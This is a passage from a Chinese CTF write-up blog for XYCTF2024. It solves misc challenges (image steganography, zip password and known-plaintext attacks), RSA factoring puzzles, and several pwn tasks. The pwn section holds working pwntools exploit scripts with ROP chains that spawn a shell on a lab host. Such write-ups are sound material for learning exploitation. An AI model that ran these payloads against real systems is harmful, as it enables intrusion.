class="hljs-number">1</span>))), m=<span class="hljs-number">4</span>,d=<span class="hljs-number">4</span>)<br>    <span class="hljs-comment">#m=N.small_roots(x=2^(8*(i//2-6)),y=2^(8*(i-i//2)), beta=1, epsilon=0.05)</span><br>    <span class="hljs-attribute">print</span>(i,end=&#x27; &#x27;)<br>    <span class="hljs-attribute">if</span> m1:<br>        <span class="hljs-attribute">print</span>()<br>        <span class="hljs-attribute">print</span>(m1)<br>        <span class="hljs-attribute">x</span>,y=m1[<span class="hljs-number">0</span>]<br>        <span class="hljs-attribute">print</span>(b&#x27;XYCTF&#123;&#x27;+long_to_bytes(x)+long_to_bytes(y)+b&#x27;&#125;&#x27;)<br><span class="hljs-comment">#len(flag)=72</span><br><span class="hljs-comment">#b&#x27;XYCTF&#123;jun_mai_quan_xia_ni_xiao_gu___wo_ji_ren_jian_xue_man_tou____114514&#125;&#x27;    </span><br></code></pre></td></tr></table></figure>








<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>扫描二维码关注公众号，发送“XYCTF2024，启动启动启动！！！”获取flag</p>
<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>百度识图</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240401224835774.png" srcset="/img/loading.gif" lazyload class title="image-20240401224835774">

<p>查看第一张相似图片，游戏名为Papers Please，故flag:XYCTF{Papers Please}</p>
<h3 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h3><p>压缩包得到一张图片和密文，猜测可能是维吉尼亚或者凯斯密码，随波逐流一键解码</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240401225144467.png" srcset="/img/loading.gif" lazyload class title="image-20240401225144467">

<p>得到flag:XYCTF{liu_ye_mei_you_xiao_jj}</p>
<h3 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h3><img src="/2024/04/29/XYCTF2024WP/image-20240406233327363.png" srcset="/img/loading.gif" lazyload class title="image-20240406233327363">

<p>修改hint.png宽高得到hint，猜测压缩包密码是20240401，得到WATERMARK.jpg，图片水印得到</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240406233833698.png" srcset="/img/loading.gif" lazyload class title="image-20240406233833698">

<h3 id="ZIP神之套"><a href="#ZIP神之套" class="headerlink" title="ZIP神之套"></a>ZIP神之套</h3><p>压缩包打开得到一个exe文件和带密码的压缩包，压缩包密码应该与exe文件有关，运行exe发现闪退，在其所在目录下运行。得到<img src="/2024/04/29/XYCTF2024WP/image-20240406204046688.png" srcset="/img/loading.gif" lazyload class title="image-20240406204046688"></p>
<p>故考虑掩码攻击，这里我是之间猜的，应为未知位为8位，misc赛题里好几个地方都用到了比赛开始时间20240401，刚好也为8位，我猜是这个，<img src="/2024/04/29/XYCTF2024WP/image-20240406205133185.png" srcset="/img/loading.gif" lazyload class title="image-20240406205133185"></p>
<p>刚好猜对了，掩码攻击也行，得到两个压缩包，发现套.zip里有flag.zip里的文件，刚好可以选择明文攻击</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240406204350324.png" srcset="/img/loading.gif" lazyload class title="image-20240406204350324">

<img src="/2024/04/29/XYCTF2024WP/image-20240406204445831.png" srcset="/img/loading.gif" lazyload class title="image-20240406204445831">

<p>得到密钥，解压得到flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">XYCTF</span>&#123;<span class="hljs-number">1</span>A4B8-C9D2F3E-<span class="hljs-number">6</span>A4B8C-<span class="hljs-number">9</span>D2F3E7F&#125;<br></code></pre></td></tr></table></figure>



<h3 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h3><p>抓包改url向flag.php发送信息</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240406234134890.png" srcset="/img/loading.gif" lazyload class title="image-20240406234134890">

<h3 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h3><p>直接在Ubuntu运行，提示：riscv64-binfmt-P: Could not open ‘&#x2F;lib&#x2F;ld-linux-riscv64-lp64d.so.1’: No such file or directory</p>
<p>百度搜索，<a target="_blank" rel="noopener" href="https://blog.csdn.net/bebebug/article/details/127829361">找到文章</a>，执行代码</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><br>sudo apt <span class="hljs-keyword">install</span> libc6-riscv64-cross<br>sudo apt <span class="hljs-keyword">install</span> binutils-riscv64-linux-gnu<br>sudo apt <span class="hljs-keyword">install</span> gcc-riscv64-linux-gnu<br>sudo apt <span class="hljs-keyword">install</span> binutils-riscv64-unknown-elf<br>sudo apt <span class="hljs-keyword">install</span> gcc-riscv64-unknown-elf<br>sudo apt <span class="hljs-keyword">install</span> qemu-system-misc<br>sudo apt <span class="hljs-keyword">install</span> qemu-user<br><br>sudo cp /usr/riscv64-linux-gnu/lib/* /lib/<br><br></code></pre></td></tr></table></figure>

<p>运行附件得到</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240407124249519.png" srcset="/img/loading.gif" lazyload class title="image-20240407124249519">

<p>将1换成0，即可得flag</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240415202639649.png" srcset="/img/loading.gif" lazyload class title="image-20240415202639649">

<h3 id="九转修仙转（未完成）"><a href="#九转修仙转（未完成）" class="headerlink" title="九转修仙转（未完成）"></a>九转修仙转（未完成）</h3><p>压缩包最外层密码：XYCTF20240401</p>
<h4 id="炼气-天书解密"><a href="#炼气-天书解密" class="headerlink" title="炼气:天书解密"></a>炼气:天书解密</h4><img src="/2024/04/29/XYCTF2024WP/image-20240407203224965.png" srcset="/img/loading.gif" lazyload class title="image-20240407203224965">

<p>爆破图片宽高得到</p>
<img src="/2024/04/29/XYCTF2024WP/image-20240407203514580.png" srcset="/img/loading.gif" lazyload class title="image-20240407203514580">

<h4 id="筑基"><a href="#筑基" class="headerlink" title="筑基"></a>筑基</h4><h4 id="结丹"><a href="#结丹" class="headerlink" title="结丹"></a>结丹</h4><h4 id="第四层：元婴"><a href="#第四层：元婴" class="headerlink" title="第四层：元婴"></a>第四层：元婴</h4><img src="/2024/04/29/XYCTF2024WP/image-20240407220852148.png" srcset="/img/loading.gif" lazyload class title="image-20240407220852148">

<h4 id="第5层：化神"><a href="#第5层：化神" class="headerlink" title="第5层：化神"></a>第5层：化神</h4><p>md5爆破得到压缩包密码：key{liuyyds}</p>
<h4 id="炼虚"><a href="#炼虚" class="headerlink" title="炼虚"></a>炼虚</h4><h4 id="合体"><a href="#合体" class="headerlink" title="合体"></a>合体</h4><h4 id="第8层：大乘-p-q-剪枝算法"><a href="#第8层：大乘-p-q-剪枝算法" class="headerlink" title="第8层：大乘   p^q  剪枝算法"></a>第8层：大乘   p^q  剪枝算法</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs 1c">n= <span class="hljs-number">22424440693845876425615937206198156323192795003070970628372481545586519202571910046980039629473774728476050491743579624370862986329470409383215065075468386728605063051384392059021805296376762048386684738577913496611584935475550170449080780985441748228151762285167935803792462411864086270975057853459586240221348062704390114311522517740143545536818552136953678289681001385078524272694492488102171313792451138757064749512439313085491407348218882642272660890999334401392575446781843989380319126813905093532399127420355004498205266928383926087604741654126388033455359539622294050073378816939934733818043482668348065680837</span><br>c= <span class="hljs-number">1400352566791488780854702404852039753325619504473339742914805493533574607301173055448281490457563376553281260278100479121782031070315232001332230779334468566201536035181472803067591454149095220119515161298278124497692743905005479573688449824603383089039072209462765482969641079166139699160100136497464058040846052349544891194379290091798130028083276644655547583102199460785652743545251337786190066747533476942276409135056971294148569617631848420232571946187374514662386697268226357583074917784091311138900598559834589862248068547368710833454912188762107418000225680256109921244000920682515199518256094121217521229357</span><br>gift= <span class="hljs-number">14488395911544314494659792279988617621083872597458677678553917360723653686158125387612368501147137292689124338045780574752580504090309537035378931155582239359121394194060934595413606438219407712650089234943575201545638736710994468670843068909623985863559465903999731253771522724352015712347585155359405585892</span><br>from Crypto.Util.number import*<br>from gmpy2 import*<br>import math<br><br><br>def check_cong(k, p, q, n, xored=None):<br>    kmask = (<span class="hljs-number">1</span> &lt;&lt; k) - <span class="hljs-number">1</span><br>    p <span class="hljs-meta">&amp;= kmask</span><br>    q <span class="hljs-meta">&amp;= kmask</span><br>    n <span class="hljs-meta">&amp;= kmask</span><br>    pqm = (p*q) <span class="hljs-meta">&amp; kmask</span><br>    return pqm == n and (xored is None or (p^q) == (xored <span class="hljs-meta">&amp; kmask))</span><br><br>def extend(k, a):<br>    kbit = <span class="hljs-number">1</span> &lt;&lt; (k-<span class="hljs-number">1</span>)<br>    assert a &lt; kbit<br>    yield a<br>    yield a <span class="hljs-string">| kbit</span><br><br>def factor(n, p_xor_q):<br>    tracked = set([(p, q) for p in [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>] for q in [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]<br>                   if check_cong(<span class="hljs-number">1</span>, p, q, n, p_xor_q)])<br><br>    PRIME_BITS = int(math.ceil(math.<span class="hljs-built_in">log</span>(n, <span class="hljs-number">2</span>)/<span class="hljs-number">2</span>))<br><br>    maxtracked = len(tracked)<br>    for k in range(<span class="hljs-number">2</span>, PRIME_BITS+<span class="hljs-number">1</span>):<br>        newset = set()<br>        for tp, tq in tracked:<br>            for newp_ in extend(k, tp):<br>                for newq_ in extend(k, tq):<br>                    <span class="hljs-meta"># Remove symmetry</span><br>                    newp, newq = sorted([newp_, newq_])<br>                    if check_cong(k, newp, newq, n, p_xor_q):<br>                        newset.add((newp, newq))<br><br>        tracked = newset<br>        if len(tracked) &gt; maxtracked:<br>            maxtracked = len(tracked)<br>    print(&#x27;Tracked set size: &#123;&#125; (max=&#123;&#125;)&#x27;.format(len(tracked), maxtracked))<br><br>    <span class="hljs-meta"># go through the tracked set and pick the correct (p, q)</span><br>    for p, q in tracked:<br>        if p != <span class="hljs-number">1</span> and p*q == n:<br>            return p, q<br><br>    assert False, &#x27;factors were not in tracked set. Is your p^q correct?&#x27;<br><br>p, q = factor(n, gift)<br>print(p)<br>print(q)<br>&#x27;&#x27;&#x27;<br>p=<span class="hljs-number">14580549955135</span><span class="hljs-number">18375451706708</span><span class="hljs-number">39798336872366</span><span class="hljs-number">41438331104201</span><span class="hljs-number">83863865952880</span><span class="hljs-number">60139791135454</span><span class="hljs-number">98041301469392</span><span class="hljs-number">48669539726622</span><span class="hljs-number">66748526407954</span><span class="hljs-number">49287761042960</span><span class="hljs-number">28862443729240</span><span class="hljs-number">35960962307198</span><span class="hljs-number">91065947563933</span><span class="hljs-number">39458959227173</span><span class="hljs-number">07291255423855</span><span class="hljs-number">61627492458427</span><span class="hljs-number">05701261800503</span><span class="hljs-number">63106535962473</span><span class="hljs-number">04910757655631</span><span class="hljs-number">54610137558590</span><span class="hljs-number">97114552522187</span><span class="hljs-number">75517142362107</span>1<br>q=<span class="hljs-number">15379694704827</span><span class="hljs-number">04295104447564</span><span class="hljs-number">58855481287460</span><span class="hljs-number">63946856300121</span><span class="hljs-number">34899076251324</span><span class="hljs-number">38953570738468</span><span class="hljs-number">18177092509186</span><span class="hljs-number">74397275190746</span><span class="hljs-number">85449940618659</span><span class="hljs-number">58311433850187</span><span class="hljs-number">26982207454735</span><span class="hljs-number">31199063071421</span><span class="hljs-number">85252161880576</span><span class="hljs-number">56279991061880</span><span class="hljs-number">15431567625318</span><span class="hljs-number">85089989505213</span><span class="hljs-number">01570378229609</span><span class="hljs-number">45909520973243</span><span class="hljs-number">79350774081743</span><span class="hljs-number">67075045057091</span><span class="hljs-number">94025074527084</span><span class="hljs-number">80305410760554</span>7<br>&#x27;&#x27;&#x27;<br>e = <span class="hljs-number">65537</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>print(long_to_bytes(m))<br><span class="hljs-meta">#password&#123;pruning_algorithm&#125;</span><br></code></pre></td></tr></table></figure>



<img src="/2024/04/29/XYCTF2024WP/image-20240407213102631.png" srcset="/img/loading.gif" lazyload class title="image-20240407213102631">

<img src="/2024/04/29/XYCTF2024WP/image-20240407212856962.png" srcset="/img/loading.gif" lazyload class title="image-20240407212856962">

<img src="/2024/04/29/XYCTF2024WP/image-20240407212928896.png" srcset="/img/loading.gif" lazyload class title="image-20240407212928896">

<h4 id="第9层：渡劫"><a href="#第9层：渡劫" class="headerlink" title="第9层：渡劫"></a>第9层：渡劫</h4><p>hint9.py</p>
<p>  exp</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros">n = 107803636687595025440095910573280948384697923215825513033516157995095253288310988256293799364485832711216571624134612864784507225218094554935994320702026646158448403364145094359869184307003058983513345331145072159626461394056174457238947423145341933245269070758238088257304595154590196901297344034819899810707<br>c = 46049806990305232971805282370284531486321903483742293808967054648259532257631501152897799977808185874856877556594402112019213760718833619399554484154753952558768344177069029855164888168964855258336393700323750075374097545884636097653040887100646089615759824303775925046536172147174890161732423364823557122495<br>list = [618066045261118017236724048165995810304806699407382457834629201971935031874166645665428046346008581253113148818423751222038794950891638828062215121477677796219952174556774639587782398862778383552199558783726207179240239699423569318, 837886528803727830369459274997823880355524566513794765789322773791217165398250857696201246137309238047085760918029291423500746473773732826702098327609006678602561582473375349618889789179195207461163372699768855398243724052333950197]<br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-keyword">for</span> a1 <span class="hljs-keyword">in</span> range(256):<br>    <span class="hljs-keyword">for</span> a2 <span class="hljs-keyword">in</span> range(256):<br>        <span class="hljs-attribute">p</span>=gcd(list[0]<span class="hljs-number">*a1</span>-list[1]<span class="hljs-number">*a2</span>,n)<br>        <span class="hljs-keyword">if</span> n%<span class="hljs-attribute">p</span>==0 <span class="hljs-keyword">and</span> p!=1 <span class="hljs-keyword">and</span> p!=n:<br>            <span class="hljs-built_in">print</span>(list[0] * a1 - list[1] * a2 % n)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><br><br><span class="hljs-attribute">p</span>=12951283811821084332224320465045864899191924765916891677355364529850728204537369439910942929239876470054661306841056350863576815710640615409980095344446711<br><br><span class="hljs-attribute">q</span>=n//p<br><span class="hljs-built_in">print</span>(q,<span class="hljs-attribute">n</span>==p*q)<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-built_in">print</span>(gcd(e,(p-1)))<br><span class="hljs-attribute">d</span>=invert(e,(p-1))<br><span class="hljs-built_in">print</span>(d)<br><br><span class="hljs-attribute">m</span>=powmod(c%p,d,p)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;game_over&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="hello-world-签到"><a href="#hello-world-签到" class="headerlink" title="hello_world(签到)"></a>hello_world(签到)</h3><p>exp</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)<br>p = remote(<span class="hljs-string">&#x27;192.168.182.1&#x27;</span>,13830)<br><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28<br>p.send(payload)<br><span class="hljs-attribute">base</span>=u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b<span class="hljs-string">&quot;\x00&quot;</span>))-0x29d90<br><span class="hljs-attribute">pop_rdi</span>=0x2a3e5+base<br><span class="hljs-attribute">system</span>=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-attribute">binsh</span>=base+0x1d8678<br><span class="hljs-attribute">ret</span>=base+0x2db7d<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br><br>p.sendlineafter(b<span class="hljs-string">&#x27;please input your name:&#x27;</span>,payload)<br>p.interactive()<br>XYCTF&#123;a954b733-9403-42ee-b59f-ff006a2eac03&#125;<br></code></pre></td></tr></table></figure>

<h3 id="static-link"><a href="#static-link" class="headerlink" title="static_link"></a>static_link</h3><p>exp</p>
<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span> = <span class="hljs-title">remote</span><span class="hljs-params">(&#x27;<span class="hljs-number">192.168</span>.<span class="hljs-number">182.1</span>&#x27;,<span class="hljs-number">14286</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">pop_rdi</span> = 0<span class="hljs-title">x401f1f</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">pop_rsi</span> = 0<span class="hljs-title">x409f8e</span> </span><br><span class="hljs-function"><span class="hljs-title">pop_rdx</span> = 0<span class="hljs-title">x451322</span> </span><br><span class="hljs-function"><span class="hljs-title">pop_rax</span> = 0<span class="hljs-title">x447fe7</span> </span><br><span class="hljs-function"><span class="hljs-title">ret_addr</span> = 0<span class="hljs-title">x40101a</span> </span><br><span class="hljs-function"><span class="hljs-title">syscall_addr</span> = 0<span class="hljs-title">x447590</span> </span><br><span class="hljs-function"><span class="hljs-title">binsh_addr</span> = 0<span class="hljs-title">x4C5240</span> </span><br><span class="hljs-function"><span class="hljs-title">read_addr</span> = 0<span class="hljs-title">x447580</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload1</span> = <span class="hljs-title">b&#x27;a&#x27;</span>* 0<span class="hljs-title">x28</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> +<span class="hljs-title">p64</span><span class="hljs-params">(pop_rsi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(binsh_addr)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdx)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">256</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(read_addr)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rax)</span>+ <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">59</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(binsh_addr )</span>+<span class="hljs-title">p64</span><span class="hljs-params">(pop_rsi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdx)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(syscall_addr)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">send</span><span class="hljs-params">(payload1)</span> </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">send</span><span class="hljs-params">(&#x27;/bin/sh&#x27;)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span> </span><br></code></pre></td></tr></table></figure>



<h3 id="guestbook1"><a href="#guestbook1" class="headerlink" title="guestbook1"></a>guestbook1</h3><p>exp</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)<br><br><br><span class="hljs-attribute">p</span> = remote(&#x27;<span class="hljs-number">192.168.182.1</span>&#x27;,<span class="hljs-number">12571</span>)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">&quot;index\n&quot;</span>,b&#x27;<span class="hljs-number">32</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">&quot;name:\n&quot;</span>, b&#x27;<span class="hljs-number">111</span>&#x27;)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">&quot;id:\n&quot;</span>, b&#x27;<span class="hljs-number">0</span>&#x27;)<br><span class="hljs-attribute">ret_addr</span>=<span class="hljs-number">0</span>x40101A<br><span class="hljs-attribute">backdoor</span>=<span class="hljs-number">0</span>x40133A<br><span class="hljs-attribute">ls</span>=[<span class="hljs-number">58</span>,<span class="hljs-number">19</span>,<span class="hljs-number">64</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):<br>	<span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">&quot;index\n&quot;</span>, b&#x27;%d&#x27;%i)<br>	<span class="hljs-attribute">p</span>.sendafter(b<span class="hljs-string">&quot;name:\n&quot;</span>, p64(backdoor)*<span class="hljs-number">2</span>)<br>	<span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">&quot;id:\n&quot;</span>, b&#x27;%d&#x27;%ls[i%<span class="hljs-number">8</span>])<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">&quot;index\n&quot;</span>, b&#x27;-<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">p</span>.interactive()<br><br><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF-WriteUp/" class="category-chain-item">CTF WriteUp</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Crypto-Misc/" class="print-no-link">#Crypto Misc</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>XYCTF2024WP</div>
      <div>http://tmagwaro.github.io/2024/04/29/XYCTF2024WP/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>TMagWarO</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年4月29日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/04/29/moectf2023/" title="moectf2023">
                        <span class="hidden-mobile">moectf2023</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>
